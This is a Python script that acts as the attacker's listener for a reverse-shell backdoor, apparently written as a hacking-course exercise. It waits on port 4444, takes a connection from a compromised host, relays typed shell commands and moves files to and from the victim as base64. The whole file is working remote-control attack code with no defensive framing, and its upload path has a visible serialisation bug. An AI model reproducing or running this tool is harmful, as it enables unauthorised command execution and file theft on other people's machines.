#!usr/bin/env python

import socket
import json
import base64

#This is TCP = SOCK_STREAM
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.43.103", 4444))

listener.listen(0)
print("[+] Waiting for incoming connection.")
connection, address = listener.accept()
print("[+] New connection from " + str(address))


def reliable_send(data):
    # TypeError: Object of type bytes is not JSON serializable
    json_data = json.dumps(data)
    json_data = json_data.encode("utf-8")  # encoding in bytes
    connection.send(json_data)  # need bytes for sending


def reliable_receive():
    json_data = b""
    while True:
        try:
            json_data = json_data + connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue


def execute_command(command):
    reliable_send(command)
    if command[0] == "exit":
        connection.close()
        exit()
    return reliable_receive()


def write_file(path, content):
    print(type(content))
    #  Invalid base64-encoded string: number of data characters (906413) cannot be 1 more than a multiple of 4
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "Download successful."


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


while True:
    command = input(">> ")
    command = command.split(" ")
    if command[0] == "upload":
        file_content = read_file(command[1])
        command.append(file_content)

    result = execute_command(command)
    if command[0] == "download":
        result = write_file(command[1], result)

    #result = str(result)
    #result = result.encode("utf-8")
    #result = result.replace(b"\\r\\n", b"\\n")
    #result = result.decode("utf-8")

    print(result)
